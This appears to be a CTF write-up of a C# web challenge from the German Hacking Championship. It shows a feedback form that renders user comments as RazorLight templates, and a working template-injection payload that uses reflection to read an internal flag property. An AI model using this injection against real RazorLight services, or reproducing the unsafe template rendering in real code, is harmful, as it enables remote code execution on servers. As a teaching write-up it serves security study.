+++
date = '2025-10-07T11:34:57+02:00'
title = 'DHM 2025 - DotNett'
keywords = ['ctf']
+++

One of the challenges of the second iteration of the [German Hacking Championship](https://hacking-meisterschaft.de) was a web-based feedback form, written in C#.
The service contained an internal class `_Flag_` that we had to leak:

```csharp
internal class _Flag_ {
    internal static string FLAG => "DHM{fake}";
}
```

<!--more-->

The only input possibility was the feedback form.

{{< centerimage src="/posts/dotnett/feedback.png" alt="Dodge car" maxWidth="300px" >}}

The `FeedbackController` defines entry paths to submit and view our feedback.
The code stores our feedback in a dictionary called `Templates`, and redirects us to `/report?id={id}`, which renders the submitted comment as a Razor template.
Razor is a markup language for embedding .NET code in webpages, similarly to the templating engine of the Django framework.
Intuitively, template injection might be the solution.

```csharp {hl_lines=["29-42"]}
using Microsoft.AspNetCore.Mvc;
using RazorLight;
using System;
using System.Collections.Concurrent;
using System.Threading.Tasks;

namespace DHM_Feedback.Controllers {
    public class FeedbackController : Controller {
        private static readonly ConcurrentDictionary<string, string> Templates = new();
        private static readonly RazorLightEngine Engine = new RazorLightEngineBuilder()
            .UseMemoryCachingProvider()
            .Build();

        [HttpGet("/feedback")]
        public IActionResult Feedback() => View();

        [HttpGet("/")]
        public IActionResult Index() {
            return View("Index");
        }

        [HttpPost("/submit")]
        public IActionResult Submit([FromForm] string comment) {
            var id = Guid.NewGuid().ToString("N");
            Templates[id] = comment;
            return Redirect($"/report?id={id}");
        }

        [HttpGet("/report")]
        public async Task<IActionResult> Report(string id) {
            if (id == null || !Templates.ContainsKey(id)) {
                return NotFound("No template");
            }
            var template = Templates[id];
            string result;
            try {
                result = await Engine.CompileRenderStringAsync<object>(id, template, null);
            } catch (Exception ex) {
                result = "[error] " + ex.Message;
            }
            return Content(result, "text/html");
        }
    }
}
```

The following line is interesting:
```csharp
    result = await Engine.CompileRenderStringAsync<object>(id, template, null);
```

This is very problematic since the second argument of the function is the [template that will be render](https://github.com/toddams/RazorLight?tab=readme-ov-file).
Using user input as a template implies code execution.
To write C# in our feedback form, we can use the `@` symbol, which marks the transition from HTML to C#.
Using `@(_Flag._).FLAG`, we obtain as an output:

```
[error] Failed to compile generated Razor template: - (0:6) '_Flag_' is inaccessible due to its protection level See CompilationErrors for detailed information
```

The issue is here that we cannot reference `_Flag_` because it's internal.
We could, however, obtain the flag using reflection.
Reflection is a way to let a program inspect and interact with its own metadata and types at runtime.
This method allows to read private members of internal classes.
Since the code that contains this member is compiled into the `DHM_Feedback.dll`, we first obtain the `DHM_Feedback` assembly, reference the type and obtain the internal property `FLAG`:

```csharp
@using System.Reflection
@using System

@{
    var assembly = Assembly.Load("DHM_Feedback");
    var type = assembly.GetType("_Flag_");
    var prop = type.GetProperty("FLAG", BindingFlags.NonPublic | BindingFlags.Static);
    var flag = prop.GetValue(null);
    @flag
}
```
